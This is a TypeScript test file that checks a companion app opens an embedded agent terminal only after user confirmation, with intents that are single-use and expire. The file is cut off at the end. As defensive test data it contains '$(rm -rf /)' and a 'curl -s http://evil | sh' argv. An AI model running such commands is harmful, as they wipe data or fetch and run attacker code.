/**
 * #502 C — Mode C embed intent (Option 1).
 *
 * Contract under test:
 *  - the ACP path may RECORD an embed intent; it must never CREATE anything (no PTY, no tab, no
 *    outer terminal). `embed: true` is the only way into the embed branch of
 *    `openLocalTerminalForAgent`, and that branch returns before any host-terminal opener.
 *  - `terminal.open` (existing panel tab, existing `argv?: string[]` frame, existing L2) consumes
 *    the intent AFTER approval; without an intent the frame is a login shell, exactly as today.
 *  - the L2 confirmation copy describes what will actually run (agent basename + argv count), never
 *    the task text.
 */
import { describe, it, before, after, beforeEach, type TestContext } from "node:test"
import assert from "node:assert/strict"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"

// Isolate data dir before any app module is dynamically imported (mirrors tests/pty-terminal.test.ts).
const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "cmspark-embed-c-"))
process.env.HOME = tempHome
process.env.CMSPARK_DATA_DIR = path.join(tempHome, ".cmspark-agent")
process.env.SHELL = process.execPath
delete process.env.DEEPSEEK_API_KEY

let config: typeof import("../src/config")
let handleMessage: typeof import("../src/message-router").handleMessage
let ThreadManager: typeof import("../src/threads/thread-manager").ThreadManager
let SkillEngine: typeof import("../src/skills/skill-engine").SkillEngine
let pty: typeof import("../src/pty/session")
let acpMod: typeof import("../src/acp/manager")
let protocolSession: typeof import("../src/acp/protocol-session")
let getAuditLogPath: typeof import("../src/packs/audit-log").getAuditLogPath
let embed: typeof import("../src/acp/open-local-terminal")
let winSpawn: typeof import("../src/acp/win-spawn")

let wsDir = ""
let otherWsDir = ""
let agentBin = ""

class MockPty {
  pid = 0
  killed = false
  private exitCb: ((e: { exitCode: number; signal?: number }) => void) | undefined
  write() {}
  resize() {}
  pause() {}
  resume() {}
  kill() {
    this.killed = true
    this.exitCb?.({ exitCode: 0, signal: 0 })
  }
  onData() {}
  onExit(cb: (e: { exitCode: number; signal?: number }) => void) {
    this.exitCb = cb
  }
}

/** Spawn recorder: `__testSetPtySpawn` captures the real `(file, args)` triple. */
let spawnCalls: Array<{ file: string; args: string[] }> = []
/** Outer-terminal openers that must never be reached on the embed path — and that fail loudly. */
let openerCalls: string[] = []

function armThrowingOpeners(): void {
  openerCalls = []
  embed.__testSetOuterOpeners({
    darwin: async () => {
      openerCalls.push("darwin")
      throw new Error("outer darwin terminal opener reached")
    },
    linux: (term: string) => {
      openerCalls.push(`linux:${term}`)
      throw new Error("outer linux terminal opener reached")
    },
    windows: async () => {
      openerCalls.push("windows")
      throw new Error("outer windows terminal opener reached")
    },
  })
}

function armSpawn(): void {
  pty.__testResetPtySessions()
  pty.__testSetPtyPlatform("darwin")
  spawnCalls = []
  pty.__testSetPtySpawn((file, args) => {
    spawnCalls.push({ file, args })
    return new MockPty()
  })
}

const realPlatform = process.platform

/** `openLocalTerminalForAgent` reads `process.platform` directly; patch it for the duration. */
async function withPlatform<T>(p: NodeJS.Platform, fn: () => Promise<T>): Promise<T> {
  Object.defineProperty(process, "platform", { value: p, configurable: true })
  try {
    return await fn()
  } finally {
    Object.defineProperty(process, "platform", { value: realPlatform, configurable: true })
  }
}

function embedOpts(overrides: Record<string, unknown> = {}) {
  return {
    command: agentBin,
    cwd: wsDir,
    agentId: "claude",
    goalHint: "goal",
    agentLabel: "Claude",
    prompt: "TASK-BODY",
    terminalApp: "auto",
    ...overrides,
  } as Parameters<typeof import("../src/acp/open-local-terminal").openLocalTerminalForAgent>[0]
}

function services() {
  return {
    threadManager: new ThreadManager(),
    skillEngine: new SkillEngine(),
    historyStore: { record: () => 0 } as never,
  }
}

type ConfirmCapture = { codes: string[]; order: string[] }

function panel(opts: { confirm?: boolean; capture?: ConfirmCapture; onConfirm?: () => void } = {}) {
  return {
    originWs: { readyState: 1 },
    surface: "panel" as const,
    sendToExtension: () => {},
    requestConfirmation: async (details: { code: string }) => {
      opts.capture?.codes.push(details.code)
      opts.capture?.order.push("confirm")
      opts.onConfirm?.()
      const approved = opts.confirm !== false
      return { approved, confirmationId: "c1", reason: approved ? "approved" : "denied" }
    },
  }
}

function boundThread(svc: ReturnType<typeof services>, ws: string, title = "embed") {
  const thr = svc.threadManager.create(title)
  svc.threadManager.update(thr.id, { workspace_root: ws })
  return thr
}

before(async () => {
  config = await import("../src/config")
  await config.initDataDir()
  handleMessage = (await import("../src/message-router")).handleMessage
  ThreadManager = (await import("../src/threads/thread-manager")).ThreadManager
  SkillEngine = (await import("../src/skills/skill-engine")).SkillEngine
  pty = await import("../src/pty/session")
  acpMod = await import("../src/acp/manager")
  protocolSession = await import("../src/acp/protocol-session")
  getAuditLogPath = (await import("../src/packs/audit-log")).getAuditLogPath
  embed = await import("../src/acp/open-local-terminal")
  winSpawn = await import("../src/acp/win-spawn")

  wsDir = fs.mkdtempSync(path.join(os.tmpdir(), "cmspark-embed-ws-"))
  otherWsDir = fs.mkdtempSync(path.join(os.tmpdir(), "cmspark-embed-ws2-"))
  agentBin = path.join(tempHome, "fake-claude")
  fs.writeFileSync(agentBin, "#!/bin/sh\nexit 0\n", { mode: 0o755 })
})

after(() => {
  pty.__testResetPtySessions()
  embed.__resetEmbedIntentsForTests()
  embed.__testSetOuterOpeners()
  fs.rmSync(tempHome, { recursive: true, force: true })
  fs.rmSync(wsDir, { recursive: true, force: true })
  fs.rmSync(otherWsDir, { recursive: true, force: true })
})

beforeEach(() => {
  embed.__resetEmbedIntentsForTests()
  armThrowingOpeners()
  armSpawn()
  config.saveConfig({ embedded_terminal: { enabled: true } })
})

const realWs = () => fs.realpathSync(wsDir)
const realBin = () => fs.realpathSync(agentBin)

// ─────────────────────────────── A. buildEmbedArgv ───────────────────────────────

describe("buildEmbedArgv (pure)", () => {
  it("returns [] with no file and no non-blank prompt", () => {
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude" }), [])
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude", prompt: "   \n " }), [])
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude", prompt: "" }), [])
  })

  it("kimi gets no task argv (positionals are subcommands, case-insensitive)", () => {
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "kimi", prompt: "TASK" }), [])
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "KIMI", prompt: "TASK" }), [])
  })

  it("opencode gets --prompt <task>", () => {
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "opencode", prompt: "  TASK  " }), [
      "--prompt",
      "TASK",
    ])
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "OpenCode", prompt: "T" }), ["--prompt", "T"])
  })

  it("generic agents get the task as a single trailing argv", () => {
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude", prompt: " TASK " }), ["TASK"])
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "pi", prompt: "T" }), ["T"])
    assert.deepEqual(embed.buildEmbedArgv({ prompt: "T" }), ["T"])
  })

  it("reads the prompt file contents when given (real argv, no shell quoting)", () => {
    const file = path.join(wsDir, "task-embed.md")
    fs.writeFileSync(file, "  line one\nline 'two' $(rm -rf /)\n", "utf8")
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude", promptFile: file, prompt: "inline" }), [
      "line one\nline 'two' $(rm -rf /)",
    ])
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "opencode", promptFile: file }), [
      "--prompt",
      "line one\nline 'two' $(rm -rf /)",
    ])
  })

  it("falls back to the trimmed inline prompt when the file cannot be read", () => {
    const missing = path.join(wsDir, "no-such-task.md")
    assert.deepEqual(
      embed.buildEmbedArgv({ agentId: "claude", promptFile: missing, prompt: "  inline task  " }),
      ["inline task"],
    )
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude", promptFile: missing }), [])
  })

  it("a readable but empty file yields no payload (never an empty argv entry)", () => {
    const file = path.join(wsDir, "empty-task.md")
    fs.writeFileSync(file, "   \n\n", "utf8")
    assert.deepEqual(embed.buildEmbedArgv({ agentId: "claude", promptFile: file, prompt: "inline" }), [])
  })
})

// ────────────────── B. embed decision: honest refusal, no outer fallback ──────────────────

describe("openLocalTerminalForAgent embed branch", () => {
  it("refuses non-darwin honestly and never opens an outer terminal", async () => {
    const r = await withPlatform("linux", () =>
      embed.openLocalTerminalForAgent(embedOpts({ embed: true, threadId: "t-lin" })),
    )
    assert.equal(r.ok, false)
    assert.equal(r.detail, "unsupported")
    assert.deepEqual(openerCalls, [])
    assert.equal(embed.peekEmbedIntent("t-lin"), null)
  })

  it("refuses when the embedded terminal is disabled (never falls back to an outer terminal)", async () => {
    config.saveConfig({ embedded_terminal: { enabled: false } })
    const r = await embed.openLocalTerminalForAgent(embedOpts({ embed: true, threadId: "t-off" }))
    assert.equal(r.ok, false)
    assert.equal(r.detail, "embedded_terminal_disabled")
    assert.deepEqual(openerCalls, [])
    assert.equal(embed.peekEmbedIntent("t-off"), null)
  })

  it("refuses while the single PTY slot is busy; the live session is untouched", async () => {
    const live = pty.spawnPtySession({
      id: "busy",
      cols: 80,
      rows: 24,
      cwd: realWs(),
      send: () => {},
    })
    assert.equal(live.ok, true)
    const r = await embed.openLocalTerminalForAgent(embedOpts({ embed: true, threadId: "t-busy" }))
    assert.equal(r.ok, false)
    assert.equal(r.detail, "terminal_busy")
    assert.deepEqual(openerCalls, [])
    assert.equal(embed.peekEmbedIntent("t-busy"), null)
    assert.equal(pty.getLivePtyId(), "busy")
  })

  it("records a takeable intent on darwin and touches no host terminal", async () => {
    const r = await embed.openLocalTerminalForAgent(
      embedOpts({ embed: true, threadId: "t-ok", prompt: "TASK-SENTINEL-EMBED" }),
    )
    assert.equal(r.ok, true)
    assert.match(r.detail, /panel/)
    assert.match(r.detail, /PTY not started/)
    assert.doesNotMatch(r.detail, /TASK-SENTINEL-EMBED/)
    assert.deepEqual(openerCalls, [], "no outer opener may run on the embed path")
    assert.deepEqual(embed.takeEmbedIntent("t-ok"), {
      cwd: realWs(),
      file: realBin(),
      args: ["TASK-SENTINEL-EMBED"],
    })
  })

  it("mirrors the interactive argv conventions (kimi / opencode) in the recorded intent", async () => {
    const kimi = await embed.openLocalTerminalForAgent(
      embedOpts({ embed: true, threadId: "t-kimi", agentId: "kimi", prompt: "TASK" }),
    )
    assert.equal(kimi.ok, true)
    assert.deepEqual(embed.takeEmbedIntent("t-kimi")?.args, [])

    const oc = await embed.openLocalTerminalForAgent(
      embedOpts({ embed: true, threadId: "t-oc", agentId: "opencode", prompt: "TASK" }),
    )
    assert.equal(oc.ok, true)
    assert.deepEqual(embed.takeEmbedIntent("t-oc")?.args, ["--prompt", "TASK"])
  })

  it("validates the agent binary and workspace exactly like the normal path", async () => {
    const relative = await embed.openLocalTerminalForAgent(
      embedOpts({ embed: true, threadId: "t-rel", command: "claude" }),
    )
    assert.equal(relative.ok, false)
    assert.match(relative.detail, /absolute/)
    assert.equal(embed.peekEmbedIntent("t-rel"), null)

    const missingCwd = await embed.openLocalTerminalForAgent(
      embedOpts({ embed: true, threadId: "t-cwd", cwd: path.join(wsDir, "does-not-exist") }),
    )
    assert.equal(missingCwd.ok, false)
    assert.match(missingCwd.detail, /workspace/)
    assert.equal(embed.peekEmbedIntent("t-cwd"), null)
    assert.deepEqual(openerCalls, [])
  })

  it("cleans up the task file it wrote (nothing exec's it on this path)", async (t) => {
    // The normal path unlinks its temp files in a `finally`; the embed branch RETURNS before that
    // block. Without an explicit `scheduleUnlink` every embed intent would leave the user's whole
    // browser task in /tmp forever — the audit rule (never persist the prompt) would still hold in
    // the logs while the task sat on disk.
    const scheduled: string[][] = []
    t.mock.method(winSpawn, "scheduleUnlink", (paths: string[]) => {
      scheduled.push(paths)
    })
    const r = await embed.openLocalTerminalForAgent(
      embedOpts({ embed: true, threadId: "t-cleanup", prompt: "TASK-BODY" }),
    )
    assert.equal(r.ok, true)
    assert.equal(scheduled.length, 1, "the embed path must schedule its temp files for unlink")
    assert.equal(scheduled[0].length, 1)
    assert.match(scheduled[0][0], /cmspark-mode-c-.*task\.md$/)
    // The argv was read from that file BEFORE the unlink was scheduled.
    assert.deepEqual(embed.takeEmbedIntent("t-cleanup")?.args, ["TASK-BODY"])
    assert.deepEqual(openerCalls, [])
  })

  it("audits the embed intent without the task text", async () => {
    const auditPath = getAuditLogPath()
    const prior = fs.existsSync(auditPath) ? fs.readFileSync(auditPath, "utf8") : ""
    const r = await embed.openLocalTerminalForAgent(
      embedOpts({
        embed: true,
        threadId: "t-audit",
        prompt: "AUDIT-PROMPT-SENTINEL-93f1",
        agentId: "opencode",
      }),
    )
    assert.equal(r.ok, true)
    const added = fs.readFileSync(auditPath, "utf8").slice(prior.length)
    assert.match(added, /acp\.mode_c_embed_intent/)
    assert.match(added, new RegExp(`"agent_file_basename":"${path.basename(agentBin)}"`))
    assert.match(added, /"argv_argc":2/)
    assert.match(added, /"thread_id":"t-audit"/)
    assert.doesNotMatch(added, /AUDIT-PROMPT-SENTINEL-93f1/)
  })
})

// ──────────────────────────── C. pending intent store ────────────────────────────

describe("embed intent store", () => {
  const intent = { cwd: "/ws", file: "/bin/agent", args: ["a", "b"] }

  it("is single-use and does not leak internal state through the returned copy", () => {
    embed.recordEmbedIntent("t1", intent)
    const first = embed.takeEmbedIntent("t1")
    assert.deepEqual(first, intent)
    assert.notEqual(first, intent)
    first!.args.push("mutated")
    assert.equal(embed.takeEmbedIntent("t1"), null)
  })

  it("peek does not consume; take consumes", () => {
    embed.recordEmbedIntent("t1", intent)
    assert.deepEqual(embed.peekEmbedIntent("t1"), intent)
    assert.deepEqual(embed.peekEmbedIntent("t1"), intent)
    assert.deepEqual(embed.takeEmbedIntent("t1"), intent)
    assert.equal(embed.peekEmbedIntent("t1"), null)
    assert.equal(embed.takeEmbedIntent("t1"), null)
  })

  it("undefined thread id and empty string share one key", () => {
    embed.recordEmbedIntent(undefined, intent)
    assert.deepEqual(embed.takeEmbedIntent(""), intent)
  })

  it("expires after the TTL and drops the stale entry", () => {
    assert.equal(embed.EMBED_INTENT_TTL_MS, 10 * 60_000)
    embed.recordEmbedIntent("t1", intent)
    embed.__testAgeEmbedIntents(embed.EMBED_INTENT_TTL_MS + 1)
    assert.equal(embed.peekEmbedIntent("t1"), null)
    assert.equal(embed.takeEmbedIntent("t1"), null)
    // dropped, not merely hidden: a fresh record is takeable again
    embed.recordEmbedIntent("t1", intent)
    assert.deepEqual(embed.takeEmbedIntent("t1"), intent)
  })
})

// ──────────────── D. handler.ts consumes the intent behind the existing L2 ────────────────

describe("terminal.open consumes a recorded embed intent", () => {
  it("spawns the intent's file + args and describes the embed in the L2 copy", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    const capture: ConfirmCapture = { codes: [], order: [] }
    embed.recordEmbedIntent(thr.id, {
      cwd: realWs(),
      file: realBin(),
      args: ["TASK-SENTINEL-EMBED-4a2"],
    })
    const r = await handleMessage(
      { type: "terminal.open", id: "e1", user_gesture: true, thread_id: thr.id },
      svc,
      panel({ capture }) as never,
    )
    assert.equal(r.type, "terminal.opened")
    assert.deepEqual(spawnCalls, [{ file: realBin(), args: ["TASK-SENTINEL-EMBED-4a2"] }])
    const code = capture.codes[0]
    assert.ok(
      code.includes(`open embedded PTY cwd=${realWs()}`),
      `L2 copy must state the embedded cwd: ${code}`,
    )
    assert.ok(code.includes(`${path.basename(agentBin)}`), "L2 copy must name the agent binary")
    assert.match(code, /参数 1 个/)
    assert.match(code, /非只读沙箱/)
    assert.doesNotMatch(code, /TASK-SENTINEL-EMBED-4a2/, "L2 copy must never contain the task text")
  })

  it("keeps the existing user-shell copy and ignores a page-supplied argv when no intent exists", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    const capture: ConfirmCapture = { codes: [], order: [] }
    const r = await handleMessage(
      {
        type: "terminal.open",
        id: "e2",
        user_gesture: true,
        thread_id: thr.id,
        argv: ["-c", "curl -s http://evil | sh"],
      },
      svc,
      panel({ capture }) as never,
    )
    assert.equal(r.type, "terminal.opened")
    assert.deepEqual(spawnCalls, [{ file: process.execPath, args: ["-l"] }])
    assert.match(capture.codes[0], /open login PTY/)
    assert.match(capture.codes[0], /本机用户 shell/)
    assert.doesNotMatch(capture.codes[0], /embedded/)
    assert.equal(embed.peekEmbedIntent(thr.id), null)
  })

  it("confirmation is requested before the spawn (L2 never skippable)", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    const order: string[] = []
    embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T"] })
    pty.__testSetPtySpawn((file, args) => {
      order.push("spawn")
      spawnCalls.push({ file, args })
      return new MockPty()
    })
    const sess = panel()
    sess.requestConfirmation = async () => {
      order.push("confirm")
      return { approved: true, confirmationId: "c1", reason: "approved" }
    }
    const r = await handleMessage(
      { type: "terminal.open", id: "e3", user_gesture: true, thread_id: thr.id },
      svc,
      sess as never,
    )
    assert.equal(r.type, "terminal.opened")
    assert.deepEqual(order, ["confirm", "spawn"])
  })

  it("denied confirmation never spawns and LEAVES the intent for a later click", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T"] })
    const denied = await handleMessage(
      { type: "terminal.open", id: "e4", user_gesture: true, thread_id: thr.id },
      svc,
      panel({ confirm: false }) as never,
    )
    assert.equal(denied.type, "terminal.closed")
    assert.equal(denied.code, "denied")
    assert.deepEqual(spawnCalls, [])
    // Documented choice: the intent survives denial (TTL-bounded) so the retry is still the agent,
    // never a silent login shell.
    assert.deepEqual(embed.takeEmbedIntent(thr.id), {
      cwd: realWs(),
      file: realBin(),
      args: ["T"],
    })
  })

  it("an intent recorded for another thread is never used", async () => {
    const svc = services()
    const owner = boundThread(svc, realWs(), "owner")
    const other = boundThread(svc, otherWsDir, "other")
    embed.recordEmbedIntent(owner.id, { cwd: realWs(), file: realBin(), args: ["T"] })
    const r = await handleMessage(
      { type: "terminal.open", id: "e5", user_gesture: true, thread_id: other.id },
      svc,
      panel() as never,
    )
    assert.equal(r.type, "terminal.opened")
    assert.deepEqual(spawnCalls, [{ file: process.execPath, args: ["-l"] }])
    assert.notEqual(embed.peekEmbedIntent(owner.id), null)
  })

  it("an intent recorded without a thread is never claimed by an UNBOUND tab (peek and take agree)", async () => {
    // Peek and take must use the identical key test. If peek saw an intent that take refuses, the
    // L2 copy would describe an agent run and the spawn site would then answer "EMBED_INTENT_EXPIRED"
    // — an "expired" error for an intent that never expired. An unbound tab therefore stays exactly
    // on today's path (login-shell copy, `$SHELL -l`), and the unclaimed intent is left untouched.
    const svc = services()
    const capture: ConfirmCapture = { codes: [], order: [] }
    embed.recordEmbedIntent(undefined, { cwd: realWs(), file: realBin(), args: ["T"] })
    const r = await handleMessage(
      { type: "terminal.open", id: "e8", user_gesture: true },
      svc,
      panel({ capture }) as never,
    )
    assert.equal(r.type, "terminal.opened")
    assert.deepEqual(spawnCalls, [{ file: process.execPath, args: ["-l"] }])
    assert.match(capture.codes[0], /open login PTY/)
    assert.doesNotMatch(capture.codes[0], /embedded/)
    assert.notEqual(embed.peekEmbedIntent(undefined), null, "the unclaimed intent is not consumed")
  })

  it("an expired intent at spawn time fails closed instead of spawning a login shell", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T"] })
    const r = await handleMessage(
      { type: "terminal.open", id: "e6", user_gesture: true, thread_id: thr.id },
      svc,
      panel({ onConfirm: () => embed.__testAgeEmbedIntents(embed.EMBED_INTENT_TTL_MS + 1) }) as never,
    )
    assert.equal(r.type, "terminal.error")
    assert.match(String(r.error), /EMBED_INTENT/)
    assert.deepEqual(spawnCalls, [])
  })

  it("an intent recorded DURING the confirmation is refused: the dialog said user shell", async () => {
    // The mirrored race of the expired case. Mode C can start (and record an intent) while the L2
    // dialog is still open, so peek finds nothing and the user is shown/approves the LOGIN-SHELL
    // copy; a TAKE that then finds a fresh intent would spawn the agent binary with the user's task
    // file — exactly the consent violation the peek-before-copy design exists to prevent.
    const svc = services()
    const thr = boundThread(svc, realWs())
    const capture: ConfirmCapture = { codes: [], order: [] }
    const r = await handleMessage(
      { type: "terminal.open", id: "e9", user_gesture: true, thread_id: thr.id },
      svc,
      panel({
        capture,
        onConfirm: () => embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T-SENTINEL-UNCONFIRMED"] }),
      }) as never,
    )
    assert.match(capture.codes[0], /open login PTY/, "the approved copy must be the login-shell one")
    assert.doesNotMatch(capture.codes[0], /embedded/)
    assert.equal(r.type, "terminal.error")
    assert.match(String(r.error), /EMBED_INTENT_UNCONFIRMED/)
    // Fail CLOSED: not the agent, and not `$SHELL -l` either. The recorder sees zero spawns, so
    // neither branch ran — the approved copy promised a shell the panel's state no longer honours.
    assert.deepEqual(spawnCalls, [], "neither the agent nor $SHELL may spawn")
  })

  it("the refusal keeps the intent, so the re-click is the agent and the error text is honest", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    const first = await handleMessage(
      { type: "terminal.open", id: "e10", user_gesture: true, thread_id: thr.id },
      svc,
      panel({
        onConfirm: () => embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T-RETRY"] }),
      }) as never,
    )
    assert.match(String(first.error), /EMBED_INTENT_UNCONFIRMED/)
    assert.deepEqual(spawnCalls, [])
    // The mandated error text tells the user to re-click the terminal button and confirm the embed
    // copy. That sentence is only honest if the intent survived the refusal (same choice the
    // denied-confirmation path documents): otherwise the re-click would show the login copy again.
    const capture: ConfirmCapture = { codes: [], order: [] }
    const second = await handleMessage(
      { type: "terminal.open", id: "e11", user_gesture: true, thread_id: thr.id },
      svc,
      panel({ capture }) as never,
    )
    assert.equal(second.type, "terminal.opened")
    assert.match(capture.codes[0], /open embedded PTY/, "the retry must ask about the embed, not a shell")
    assert.deepEqual(spawnCalls, [{ file: realBin(), args: ["T-RETRY"] }])
  })

  it("a wire argv may refine the intent's args but never the executable", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    const capture: ConfirmCapture = { codes: [], order: [] }
    embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T"] })
    const r = await handleMessage(
      {
        type: "terminal.open",
        id: "e7",
        user_gesture: true,
        thread_id: thr.id,
        argv: ["--prompt", "WIRE"],
      },
      svc,
      panel({ capture }) as never,
    )
    assert.equal(r.type, "terminal.opened")
    assert.deepEqual(spawnCalls, [{ file: realBin(), args: ["--prompt", "WIRE"] }])
    // The copy describes what really spawns: 2 argv entries, still the agent binary.
    assert.match(capture.codes[0], /参数 2 个/)
    assert.ok(capture.codes[0].includes(path.basename(agentBin)))
  })
})

// ───────────────────── D3. malformed opts map to an honest deny ─────────────────────

describe("terminal.open spawn-refusal mapping (#502 C)", () => {
  // Built INSIDE each `it`: `describe` bodies run at module-evaluation time, i.e. before the
  // `before()` hook has imported `src/pty/session` (and before `../src/config` exists),
  // so reading `pty.MAX_PTY_ARGV_BYTES` here would throw on `undefined`.
  const cases: Array<{ name: string; build: () => string[]; match: RegExp }> = [
    { name: "empty argv entry", build: () => [""], match: /empty entry/ },
    {
      name: "argv over MAX_PTY_ARGV_BYTES",
      build: () => ["x".repeat(pty.MAX_PTY_ARGV_BYTES + 1)],
      match: /MAX_PTY_ARGV_BYTES/,
    },
  ]

  for (const c of cases) {
    it(`${c.name} is denied as a malformed request, not reported as spawn_failed`, async () => {
      const svc = services()
      const thr = boundThread(svc, realWs())
      embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: c.build() })
      const r = await handleMessage(
        { type: "terminal.open", id: "d1", user_gesture: true, thread_id: thr.id },
        svc,
        panel() as never,
      )
      assert.equal(r.type, "terminal.error")
      assert.equal(r.code, "request_failed")
      assert.equal(pty.INVALID_PTY_OPTS, "invalid_pty_opts")
      assert.match(String(r.error), c.match)
      assert.equal(r.code === "spawn_failed", false)
      assert.deepEqual(spawnCalls, [])
      // The refusal belongs to the requesting tab. `terminal.error` without an id is the
      // extension-level form (see chrome-extension/src/terminal/wire.ts + background/terminal.ts);
      // every open terminal tab would render it instead of only the one that asked.
      assert.equal(r.id, "d1", "the malformed-request refusal must carry the session id")
    })
  }

  it("a genuine spawn failure still maps to terminal.closed spawn_failed", async () => {
    const svc = services()
    const thr = boundThread(svc, realWs())
    embed.recordEmbedIntent(thr.id, { cwd: realWs(), file: realBin(), args: ["T"] })
    pty.__testSetPtySpawn(() => {
      throw new Error("chdir failed")
    })
    const r = await handleMessage(
      { type: "terminal.open", id: "d2", user_gesture: true, thread_id: thr.id },
      svc,
      panel() as never,
    )
    assert.equal(r.type, "terminal.closed")
    assert.equal(r.code, "spawn_failed")
    assert.match(String(r.error), /chdir failed/)
  })
})

// ─────────────────────────── E. manager gating + audit ───────────────────────────

function acpServerConfig() {
  return {
    echo: {
      enabled: true,
      display_name: "Echo",
      transport: "stdio" as const,
      command: process.execPath,
      args: [],
      protocol: "acp" as const,
      policy: { profile: "review_readonly" as const, allow_write: false, allow_exec: false },
    },
  }
}

function enableAcp(): void {
  config.saveConfig({
    acp: {
      enabled: true,
      servers: acpServerConfig(),
      policy: {
        require_workspace: true,
        force_confirm_session_start: true,
        default_profile: "review_readonly",
      },
    },
    coding_handoff: { open_local_terminal: true, auto_suggest: true },
  })
}

/**
 * Drive `mgr.start()` WITHOUT awaiting it. The stubbed `prompt` never settles — the session must
 * stay "running" while the Mode C decision resolves — so `start()` stays pending forever. Awaiting
 * it would leave THIS test's promise pending while nothing keeps the event loop alive, which
 * node:test reports as `cancelledByParent` / "Promise resolution is still pending but the event
 * loop has already resolved", cancelling every later test in the file too.
 */
function startDetached(mgr: { start: (id: string) => Promise<unknown> }, id: string): void {
  void mgr.start(id).catch(() => {})
}

/** Stub the ACP handshake so `start()` reaches maybeOpenLocalTerminal without a real child. */
function stubProtocol(t: TestContext): void {
  t.mock.method(protocolSession as any, "tryStartProtocolSession", async () => ({
    child: { pid: 43210 },
    client: null,
    agentSessionId: "agent-sess-stub",
    transport: "acp",
    // Never settles: the session must stay "running" while the Mode C decision resolves.
    prompt: () => new Promise(() => {}),
    cancel: () => {},
    kill: () => {},
  }))
}

async function waitForLocalTerminal(
  mgr: { getSession: (id: string) => unknown },
  id: string,
): Promise<{ local_terminal?: string; timeline?: Array<{ label: string }> }> {
  for (let i = 0; i < 100; i++) {
    const s = mgr.getSession(id) as
      | { local_terminal?: string; timeline?: Array<{ label: string }> }
      | undefined
    if (s && s.local_terminal && s.local_terminal !== "pending") return s
    await new Promise((r) => setTimeout(r, 10))
  }
  throw new Error("local_terminal did not settle")
}

describe("manager Mode C embed gating", () => {
  beforeEach(() => {
    acpMod._resetAcpManagerForTests()
    enableAcp()
  })

  it("records the intent instead of opening a terminal when embed is eligible", async (t) => {
    stubProtocol(t)
    const mgr = acpMod.getAcpManager()
    const proposed = mgr.propose({
      threadId: "t-embed-manager",
      agentId: "echo",
      goal: "EMBED-GOAL-SENTINEL",
      workspaceRoot: realWs(),
    })
    assert.equal(proposed.ok, true)
    if (!proposed.ok) return
    // ACP start itself must not record anything before the Mode C step runs.
    assert.equal(embed.peekEmbedIntent("t-embed-manager"), null)

    startDetached(mgr, proposed.session.session_id)
    const session = await waitForLocalTerminal(mgr, proposed.session.session_id)
    assert.equal(session.local_terminal, "embed_intent")
    assert.deepEqual(openerCalls, [], "no outer terminal may open on the embed path")
    assert.deepEqual(spawnCalls, [], "the manager must never spawn a PTY")
    const intent = embed.takeEmbedIntent("t-embed-manager")
    assert.ok(intent, "intent must be takeable for the session's thread")
    assert.equal(intent!.file, fs.realpathSync(process.execPath))
    assert.equal(intent!.cwd, realWs())
    const labels = (session.timeline || []).map((i: { label: string }) => i.label).join("\n")
    assert.match(labels, /终端/)
    assert.match(labels, /点击/)
    assert.doesNotMatch(labels, /已打开/)
    assert.doesNotMatch(labels, /EMBED-GOAL-SENTINEL/)
  })

  it("keeps today's outer-terminal behaviour when the embedded terminal is off", async (t) => {
    config.saveConfig({ embedded_terminal: { enabled: false } })
    stubProtocol(t)
    const mgr = acpMod.getAcpManager()
    const proposed = mgr.propose({
      threadId: "t-outer-manager",
      agentId: "echo",
      goal: "outer terminal",
      workspaceRoot: realWs(),
    })
    if (!proposed.ok) throw new Error(proposed.error)
    startDetached(mgr, proposed.session.session_id)
    const session = await waitForLocalTerminal(mgr, proposed.session.session_id)
    assert.ok(
      openerCalls.some((c) => c.startsWith("darwin")),
      "embedded off must still attempt the outer terminal (never silently cancelled)",
    )
    assert.equal(session.local_terminal, "failed")
    assert.equal(embed.peekEmbedIntent("t-outer-manager"), null)
  })

  it("keeps today's outer-terminal behaviour on a non-darwin platform", async (t) => {
    process.env.TERMINAL = process.execPath
    stubProtocol(t)
    const mgr = acpMod.getAcpManager()
    try {
      await withPlatform("linux", async () => {
        const proposed = mgr.propose({
          threadId: "t-outer-linux",
          agentId: "echo",
          goal: "outer terminal",
          workspaceRoot: realWs(),
        })
        if (!proposed.ok) throw new Error(proposed.error)
        startDetached(mgr, proposed.session.session_id)
        const session = await waitForLocalTerminal(mgr, proposed.session.session_id)
        assert.ok(openerCalls.some((c) => c.startsWith("linux")), "outer linux terminal attempted")
        assert.equal(session.local_terminal, "failed")
        assert.equal(embed.peekEmbedIntent("t-outer-linux"), null)
      })
    } finally {
      delete process.env.TERMINAL
    }
  })
})

describe("manager source locks (#502 C Option 1)", () => {
  // Compiled tests live in `.test-dist/tests`, so the repo root is two levels up; `process.cwd()`
  // (`companion/`, where `npm test` runs) is the fallback. Same shape as the existing source-lock
  // helpers in this repo (e.g. tests/assistant-tool-args-redact.test.ts).
  const srcFile = (...parts: string[]): string => {
    const candidates = [
      path.join(__dirname, "..", "..", "src", ...parts),
      path.join(process.cwd(), "src", ...parts),
    ]
